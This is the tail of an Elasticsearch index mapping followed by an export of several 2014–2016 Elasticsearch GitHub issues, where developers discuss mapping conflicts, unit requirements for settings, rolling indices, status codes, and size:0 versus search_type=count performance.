              "stc_comments-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_comments-a" : {
                "type" : "string"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_files" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_files-a" : {
                "type" : "string"
              },
              "stc_files-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_notes" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_properties-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_properties-a" : {
                "type" : "string"
              }
            }
          },
          "stc_related_items" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_related_items-a" : {
                "type" : "string"
              },
              "stc_related_items-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string"
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "tmp_collaborator" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_customer" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "tmp_dail" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "tmp_hourly" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "tmp_sow" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          }
        }
      },
      "stc_application" : {
        "_meta" : {
          "fields" : {
            "id" : {
              "type" : "UUID",
              "key" : true
            },
            "stc_name" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_workflow" : {
              "type" : "String"
            },
            "stc_identifier" : {
              "type" : "String"
            },
            "stc_custodian" : {
              "type" : "String"
            },
            "stc_color" : {
              "type" : "String"
            },
            "stc_icon" : {
              "type" : "String"
            },
            "stc_launchpad" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_position" : {
              "type" : "Float"
            },
            "stc_hidden" : {
              "type" : "Boolean"
            },
            "stc_protected" : {
              "type" : "Boolean"
            },
            "stc_objects" : {
              "type" : "JSON"
            },
            "stc_properties" : {
              "type" : "JSON",
              "datatype" : "stc_attributes"
            },
            "stc_description" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_notes" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_token" : {
              "type" : "UUID"
            },
            "stc_transitions" : {
              "type" : "JSON"
            },
            "stc_comments" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_files" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_related_items" : {
              "type" : "JSON",
              "datatype" : "stc_advanced"
            },
            "stc_tags" : {
              "type" : "JSON"
            },
            "stc_due_on" : {
              "type" : "Timestamp"
            },
            "stc_access" : {
              "type" : "JSON"
            },
            "stc_created_on" : {
              "type" : "Timestamp"
            },
            "stc_transitioned_on" : {
              "type" : "Timestamp"
            },
            "stc_updated_on" : {
              "type" : "Timestamp"
            },
            "stc_fid" : {
              "type" : "String",
              "stc_family" : "textual"
            },
            "stc_connection" : {
              "type" : "JSON"
            },
            "stc_context" : {
              "type" : "JSON"
            },
            "stc_copyright" : {
              "type" : "JSON"
            }
          },
          "has1Relations" : {
            "stc_default_datasource" : {
              "fieldName" : "stc_default_datasource",
              "relatedTableName" : "stc_datasource"
            },
            "stc_default_dashboard" : {
              "fieldName" : "stc_default_dashboard",
              "relatedTableName" : "stc_slide"
            },
            "stc_default_object" : {
              "fieldName" : "stc_default_object",
              "relatedTableName" : "stc_object"
            },
            "stc_assigned_to" : {
              "fieldName" : "stc_assigned_to",
              "relatedTableName" : "stc_user"
            },
            "stc_owner" : {
              "fieldName" : "stc_owner",
              "relatedTableName" : "stc_user"
            },
            "stc_created_by" : {
              "fieldName" : "stc_created_by",
              "relatedTableName" : "stc_user"
            },
            "stc_transitioned_by" : {
              "fieldName" : "stc_transitioned_by",
              "relatedTableName" : "stc_user"
            },
            "stc_updated_by" : {
              "fieldName" : "stc_updated_by",
              "relatedTableName" : "stc_user"
            },
            "stc_datasource" : {
              "fieldName" : "stc_datasource",
              "relatedTableName" : "stc_datasource"
            }
          },
          "datasource" : "d63fded1-043c-43ad-9135-d96b6d16cced",
          "signature" : 374898124,
          "timestamp" : 1409751256391
        },
        "properties" : {
          "_base" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "_deleted" : {
            "type" : "boolean",
            "doc_values_format" : "disk"
          },
          "id" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_access" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_access-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_access-a" : {
                "type" : "string"
              }
            }
          },
          "stc_assigned_to" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_color" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_comments" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_connection" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_connection-a" : {
                "type" : "string"
              },
              "stc_connection-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_context" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_context-a" : {
                "type" : "string"
              },
              "stc_context-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_copyright" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_copyright-a" : {
                "type" : "string"
              },
              "stc_copyright-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_created_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_created_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_custodian" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_dashboard" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_datasource" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_default_object" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_description" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_description-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_description-a" : {
                "type" : "string"
              }
            }
          },
          "stc_due_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_fid" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_fid-a" : {
                "type" : "string"
              },
              "stc_fid-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_files" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_hidden" : {
            "type" : "boolean"
          },
          "stc_icon" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_identifier" : {
            "type" : "string",
            "index" : "not_analyzed"
          },
          "stc_launchpad" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_name" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_name-ng" : {
                "type" : "string",
                "index_analyzer" : "nGram_analyzer",
                "search_analyzer" : "whitespace_analyzer"
              },
              "stc_name-a" : {
                "type" : "string"
              },
              "stc_name-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_notes" : {
            "type" : "string",
            "analyzer" : "not_analyzed_not_immense",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_notes-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_notes-a" : {
                "type" : "string"
              }
            }
          },
          "stc_objects" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_objects-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              },
              "stc_objects-a" : {
                "type" : "string"
              }
            }
          },
          "stc_owner" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_position" : {
            "type" : "float",
            "doc_values_format" : "disk"
          },
          "stc_properties" : {
            "type" : "object",
            "dynamic" : "true"
          },
          "stc_protected" : {
            "type" : "boolean"
          },
          "stc_related_items" : {
            "properties" : {
              "target_object" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              },
              "target_record" : {
                "type" : "string",
                "index" : "not_analyzed",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_tags" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_tags-a" : {
                "type" : "string"
              },
              "stc_tags-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_token" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_transitioned_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_transitions" : {
            "type" : "string",
            "analyzer" : "not_analyzed_truncated",
            "doc_values_format" : "disk",
            "fields" : {
              "stc_transitions-a" : {
                "type" : "string"
              },
              "stc_transitions-lwc" : {
                "type" : "string",
                "analyzer" : "str_lwc",
                "doc_values_format" : "disk"
              }
            }
          },
          "stc_updated_by" : {
            "type" : "string",
            "index" : "not_analyzed",
            "doc_values_format" : "disk"
          },
          "stc_updated_on" : {
            "type" : "date",
            "format" : "dateOptionalTime"
          },
          "stc_workflow" : {
            "type" : "string",
            "index" : "not_analyzed"
          }
        }
      }
    }
  }
}


```
</comment><comment author="clintongormley" created="2014-10-17T07:14:09Z" id="59474631">Hmm, I noticed that there are two fields called `stc_formula` in different types with different mappings.  Seems this is another manifestation of the problems that will be fixed in #4081.
</comment><comment author="hmalphettes" created="2014-10-21T23:55:23Z" id="60017959">@clintongormley thanks for the pointer.

By the way internally since then we are suffixing all our field names with something that reflects the type of the field. For example:

```
- stc_formula-s : non-analysed string
- stc_formula-d : date
- stc_formula-1234: custom mapping for stc_formula that hash is 1234.
....
```

This mechanism is avoiding all possible conflicts without losing the ability to query for the same field across multiple types.
</comment><comment author="clintongormley" created="2015-11-21T18:35:49Z" id="158671004">This has been fixed by #8870
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add indexCreated flag to IndexResponse action</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7634</link><project id="" key="" /><description>It would be really useful to know if a new index was automatically created after performing an index action. It'd be a much better way to trigger some task, such as alias creation or doing some caching, than cronning jobs.
</description><key id="42155851">7634</key><summary>Add indexCreated flag to IndexResponse action</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ktonga</reporter><labels /><created>2014-09-07T23:46:07Z</created><updated>2016-08-01T17:00:05Z</updated><resolved>2015-11-21T18:34:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="Jeppesen-io" created="2014-09-22T01:22:12Z" id="56320129">+1 on this idea. This would be particularly helpful creating dynamic aliases on new index creation. For example, hourly indexes with daily aliases.
</comment><comment author="geoffroya" created="2014-10-16T14:10:10Z" id="59366690">+1 too
</comment><comment author="faxm0dem" created="2014-11-24T15:00:45Z" id="64205301">:+1: for being able to autocreate alias upon index creation.
It would be extra useful to remove identical aliases on all other indices in order to be able to write to the alias (_e.g._ alias `today` would then "move" from `foo-2014.11.23` to `foo-2014.11.24` at midnight UTC).
That would require two options _e.g._ `auto_alias: "foo"` and `auto_alias_unicity: true`
</comment><comment author="fjarrett" created="2015-03-27T05:21:45Z" id="86828918">+1 Yes! This would be extremely useful.
</comment><comment author="clintongormley" created="2015-11-21T18:34:28Z" id="158670937">This should be simpler than having to pass back this flag...  Closing in favour of #7631
</comment><comment author="Ghost93" created="2015-11-21T20:11:37Z" id="158678327">+1
</comment><comment author="andrewkcarter" created="2016-08-01T17:00:05Z" id="236641150">+1
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Require units for time and byte sized settings</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7633</link><project id="" key="" /><description>I fixed ImmutableSettings (and the time/byte size value parsers it uses) to by default require units for time and byte/memory-size settings, and fixed a bunch of tests that were missing units in their settings.

SizeValue I left alone since the "singles" inherently has no unit.

I also added a boolean bwc setting `settings_require_units` (defaults to true) that you can set to false to get back to lenient default units.  I put this in InternalSettingsPreparer so it runs "early on", and it's a static boolean in ImmutableSettings.  Hopefully most users don't need to set this (i.e. they simply add the missing units to their settings on upgrade), but if they need to, they can just set it in config/elasticsearch.yml.

I fixed the parsing APIs to optionally take a setting name, so that the resulting ElasticsearchIllegalArgumentException includes the name of the troubled setting.

We still accept 0 and -1 without units...

Closes #7616
</description><key id="42138955">7633</key><summary>Require units for time and byte sized settings</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>:Core</label><label>bug</label></labels><created>2014-09-07T10:04:21Z</created><updated>2015-06-02T07:13:43Z</updated><resolved>2015-05-30T23:59:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="mikemccand" created="2014-09-08T09:22:37Z" id="54794175">Thanks @jpountz I fixed those two.
</comment><comment author="jpountz" created="2014-09-08T09:45:30Z" id="54796589">I tried to upgrade a node with the changes in this pull request, and there is an infinite loop that tries to allocate the index bu fails due to the fact that the refresh interval doesn't have a unit. I am wondering if we are ok with this behavior or if should only apply this change to new indices and node-level settings to improve the experience?
</comment><comment author="clintongormley" created="2014-09-08T09:50:41Z" id="54797081">@jpountz definitely the latter.  The intention, as I understood it, was to apply this constraint to new settings only
</comment><comment author="mikemccand" created="2014-09-08T10:01:04Z" id="54797990">Hmm, ideally we would catch existing settings that are missing units, to notify users that they may have a mis-configuration?  However, an infinite loop is clearly a bad way to notify the user ... and, also, these settings may be saved away by ES somewhere "secret", not necessarily easily changeable via e.g. elasticsearch.yml.

Hmm in fact if I try to create a new index with index.refresh_interval = 1 (missing units), it also hits apparent infinite loop of shards failing to be created.

Now I'm not sure how we can safely do this change...
</comment><comment author="s1monw" created="2014-09-18T14:36:22Z" id="56047248">can we check if the index create version to apply these checks?
</comment><comment author="clintongormley" created="2015-04-07T16:38:49Z" id="90640464">@mikemccand would love to revive this issue, perhaps getting it in for 2.0?
</comment><comment author="mikemccand" created="2015-04-07T17:54:13Z" id="90674074">I think this issue is really important but I was unsure how to proceed given the back compat issues, e.g. I hit the "infinite loop" even on doing the check for a newly created index.

I think we need to somehow improve ES error handling before we can do this?  Or maybe it has already improved since I last tried this ... I'll retest and see.
</comment><comment author="mikemccand" created="2015-04-13T18:20:57Z" id="92450998">OK I merged master and pushed here; there are some new recently added failing tests because they fail to specify units in their settings...

I confirmed that ES still hits an infinite loop (with some long pause between retries of creating/starting the index) when refresh_interval is missing its unit in create index and also on upgrade.

However the exceptions that come to the node's console log make it clear something is very wrong, and I can improve that message to point to the workaround (disabling all unit checking, globally).

I think it's important that we notify upgrading users that they possibly have a bad mis-configuration e.g. assuming that refresh_interval defaults to seconds not msec, rather than silently ignore it.

Failing that I could explore adding extensive back compatibility code based on the index's create version, but I think that will wind up being quite invasive, since "can you require units" way down inside settings parsing must be plumbed down by the numerous places that get a time or byte sized setting.

I think we should just do a hard break in 2.0, requiring units across the board.  Upgrading users can set the global setting to turn this off, and then fix their problematic settings on their own schedule...
</comment><comment author="clintongormley" created="2015-04-29T19:32:01Z" id="97553155">Also see https://github.com/elastic/elasticsearch/issues/10888
</comment><comment author="s1monw" created="2015-05-21T19:44:49Z" id="104399985">I'd like to revisit this PR since I think it's super super important. I think we should make this a progress over perfection PR and require units only for indices created &gt;= 2.0 and for node level settings. Another option is to require them everywhere and when we start up the cluster in 2.0 we upgrade all the settings to their defaults. I am not sure how feasible the latter is but even if we solve 80% here it's a huge step.
</comment><comment author="mikemccand" created="2015-05-22T09:52:48Z" id="104601748">I talked to @s1monw (well, he talked, I took notes!) ... here's a tentative plan:

We'll upgrade a pre-2.0 cluster state by assigning default units to any settings that are missing units.  This is a bit dangerous (default unit could be wrong!) but it's a nicer upgrade path than throwing hard exc / infinite loop that user can't easily fix.  It also matches what pre-2.0 is doing ... I'll log a warning for each setting we did this for.

For node-level settings, we will just always throw an exc: user can go edit the es.yml to fix.

For index-level settings, since we know index.version.created, if the index is pre-2.0, we won't enforce units for the existing settings.  If it's &gt;= 2.0, we will.  (Or maybe we can also "assign default unit on upgrade" here....?).

And then all APIs that update any cluster or index settings will require units coming in.
</comment><comment author="mikemccand" created="2015-05-30T23:59:41Z" id="107101683">Closing this in favor of #11437
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Change IndexPrimaryShardNotAllocatedException from 409 to 500</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7632</link><project id="" key="" /><description>Currently the IndexPrimaryShardNotAllocatedException returns HTTP status code 409 (conflict) which is incorrect.  It should be 500 (internal server error)
</description><key id="42138258">7632</key><summary>Change IndexPrimaryShardNotAllocatedException from 409 to 500</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-07T09:18:58Z</created><updated>2014-10-20T19:25:58Z</updated><resolved>2014-10-20T19:24:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-10-06T13:11:20Z" id="58014311">imho this should be RestStatus#SERVICE_UNAVAILABLE (503)
</comment><comment author="rjernst" created="2014-10-06T15:00:14Z" id="58029921">+1 to using 503
</comment><comment author="clintongormley" created="2014-10-15T11:54:15Z" id="59194254">A 503 is used to signal to the clients that they should retry on another node.  if the primary is not allocated, then retrying on another node won't help.
</comment><comment author="bleskes" created="2014-10-15T12:30:49Z" id="59197781">fair enough. I can't see a better alternative then. +1 on 500.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Native support for rolling index (aka Index Per Day)</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7631</link><project id="" key="" /><description>The Index per day is a very common pattern and widely used in projects with ES.
It's a ~~best~~ must practice by this days. Everybody is implementing it by hand, with hard to maintain and error-prone jobs or with extra hits to the cluster.

So it would be nice if it was implemented out of the box. It may be implemented as the well known rolling strategies of the logging frameworks. Something like this:
- Enabled in the index settings (available for using it in templates)
- The index name is just the base part of the final name
- A formatted date(time) is appended to the base name
- A date format could be specified but a default one is used otherwise
- A rolling period could be specified (30m, 6h, 2d). With default to 1d
- Every time a new index is rolled an alias to the base name is created
</description><key id="42135026">7631</key><summary>Native support for rolling index (aka Index Per Day)</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">ktonga</reporter><labels><label>:Index APIs</label><label>discuss</label></labels><created>2014-09-07T05:30:06Z</created><updated>2016-09-27T13:01:29Z</updated><resolved>2016-09-27T13:01:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="tuckerpm" created="2015-11-19T17:15:48Z" id="158124314">Any chance you can provide insight as to what was discussed?
</comment><comment author="Ghost93" created="2015-11-21T20:09:39Z" id="158678231">+1
@eliranmoyal
</comment><comment author="dakrone" created="2016-09-27T13:01:29Z" id="249857711">I believe we have this in 5.0 with the _rollover API so closing this, see https://github.com/elastic/elasticsearch/pull/18732
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>If size:0, automatically set search_type=count</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7630</link><project id="" key="" /><description>In IRC we were discussing setting `size:0` for a query makes it faster.
@drewr mentioned:

```
drewr | [19:29:42] avleen Balthek: you should use search_type=count which would be even faster
drewr | [19:29:59] different code path
```

It would make sense that if someone does a query with `size:0`. that the search type should automatically get set to count, if the result is the same, and the latter is more performant.
</description><key id="42132987">7630</key><summary>If size:0, automatically set search_type=count</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/jpountz/following{/other_user}', u'events_url': u'https://api.github.com/users/jpountz/events{/privacy}', u'organizations_url': u'https://api.github.com/users/jpountz/orgs', u'url': u'https://api.github.com/users/jpountz', u'gists_url': u'https://api.github.com/users/jpountz/gists{/gist_id}', u'html_url': u'https://github.com/jpountz', u'subscriptions_url': u'https://api.github.com/users/jpountz/subscriptions', u'avatar_url': u'https://avatars2.githubusercontent.com/u/299848?v=4', u'repos_url': u'https://api.github.com/users/jpountz/repos', u'received_events_url': u'https://api.github.com/users/jpountz/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/jpountz/starred{/owner}{/repo}', u'site_admin': False, u'login': u'jpountz', u'type': u'User', u'id': 299848, u'followers_url': u'https://api.github.com/users/jpountz/followers'}</assignee><reporter username="">avleen</reporter><labels><label>enhancement</label><label>v2.0.0-beta1</label></labels><created>2014-09-07T02:53:09Z</created><updated>2015-03-31T09:36:38Z</updated><resolved>2015-03-31T09:36:38Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="drewr" created="2014-09-07T03:02:16Z" id="54735759">I should have written _may_ be even faster.  Did you test it?  Curious if that was indeed the case for you.
</comment><comment author="clintongormley" created="2014-09-07T06:49:19Z" id="54739114">+1
</comment><comment author="avleen" created="2014-09-07T08:23:00Z" id="54740653">Always more than happy to do benchmarks! I should have done one before opening this issue.
But now we have something for future googlers!

A simple query, on cached/hot data:  `type:access_logs`:
size=0:
`( for i in $( seq 1 100 ); do; curl -s  &gt; /dev/null; done; )  0.17s user 0.32s system 1% cpu 46.681 total`

search_type=count:
`( for i in $( seq 1 100 ); do; curl -s  &gt; /dev/null; done; )  0.15s user 0.34s system 1% cpu 45.664 total`

Ran each test 3 times, took the middle result. Basically, no difference.

I tried with some more complex queries. The difference between the two was always negligible.
Even on cold data, the requests took longer but the difference was pretty much nothing.

Which leads me to wonder: In which situations SHOULD search_type=count be faster?
</comment><comment author="gsastry" created="2014-11-14T20:01:16Z" id="63120927">I'm seeing similar results in my tests. Does anyone have an explanation of the performance characteristics of `search_type=count` vs setting `size=0`?
</comment><comment author="jpountz" created="2015-01-14T11:56:33Z" id="69906207">As far as I know `size=0` only has one drawback compared to `search_type=count`, which is that the search contexts are released in a second round-trip to all shards, while the `count` search type always releases the context at the end of the query phase. If the link between the machines is good, this second round-trip is super fast, which would explain why you did not see any difference.

But I agree we should merge the two. Having two ways to do the same thing is confusing (especially given that they're not equivalent).

